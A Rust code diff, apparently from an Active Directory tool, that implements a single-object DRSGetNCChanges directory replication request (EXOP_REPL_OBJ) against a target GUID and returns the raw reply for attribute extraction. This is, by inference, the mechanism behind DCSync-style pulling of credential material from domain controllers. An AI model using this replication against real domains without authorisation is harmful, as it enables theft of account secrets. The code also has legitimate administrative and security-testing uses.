@@ -164,10 +164,52 @@ impl DrsSession {
         parse_guid_braced(&cracked)
     }
 
-    /// Placeholder for the DRSGetNCChanges call (next step).
-    pub async fn get_nc_changes(&mut self, _target_dn: &str, _target_sid: &Sid) -> Result<Vec<u8>> {
-        let _ = &mut self.rpc;
-        Err(RpcError::Protocol("DRSGetNCChanges not yet implemented".into()))
+    /// DRSGetNCChanges V8, single-object (EXOP_REPL_OBJ): replicate exactly the target
+    /// object identified by `guid`. Returns the raw reply stub for attribute extraction.
+    pub async fn get_nc_changes(&mut self, guid: &[u8; 16]) -> Result<Vec<u8>> {
+        const EXOP_REPL_OBJ: u32 = 6;
+        let mut e = NdrEncoder::new();
+        e.bytes(&self.handle); // hDrs (20)
+        e.u32(8); // dwInVersion
+        e.u32(8); // union discriminant
+        e.align(8); // the V8 arm has u64 members → 8-byte aligned after the discriminant
+
+        // DRS_MSG_GETCHGREQ_V8 — fixed part (embedded pointer pointees are deferred).
+        e.uuid(&[0u8; 16]); // uuidDsaObjDest
+        e.uuid(&[0u8; 16]); // uuidInvocIdSrc
+        e.referent(); // pNC (non-null)
+        e.u64(0); // usnvecFrom.usnHighObjUpdate
+        e.u64(0); // usnvecFrom.usnReserved
+        e.u64(0); // usnvecFrom.usnHighPropUpdate
+        e.null_ptr(); // pUpToDateVecDest
+        e.u32(0); // ulFlags
+        e.u32(1); // cMaxObjects
+        e.u32(0); // cMaxBytes
+        e.u32(EXOP_REPL_OBJ); // ulExtendedOp
+        e.u64(0); // liFsmoInfo
+        e.null_ptr(); // pPartialAttrSet
+        e.null_ptr(); // pPartialAttrSetEx
+        e.u32(0); // PrefixTableDest.PrefixCount
+        e.null_ptr(); // PrefixTableDest.pPrefixEntry
+
+        // Deferred: pNC pointee = DSNAME (conformant struct; StringName max_count first).
+        e.u32(1); // StringName conformant max_count (NameLen + terminating null)
+        e.u32(58); // structLen
+        e.u32(0); // SidLen
+        e.uuid(guid); // Guid (the target)
+        e.bytes(&[0u8; 28]); // Sid
+        e.u32(0); // NameLen
+        e.u16(0); // StringName[0] = NUL
+        while e.len() % 4 != 0 {
+            e.u8(0);
+        }
+
+        let resp = self.rpc.call_sealed(opnum::DRS_GET_NC_CHANGES, &e.into_bytes()).await?;
+        if std::env::var("ADH_DEBUG").is_ok() {
+            eprintln!("[dbg] DRSGetNCChanges reply {} bytes, head: {}", resp.len(),
+                resp.iter().take(96).map(|b| format!("{b:02x}")).collect::<String>());
+        }
+        Ok(resp)
     }
 }
 
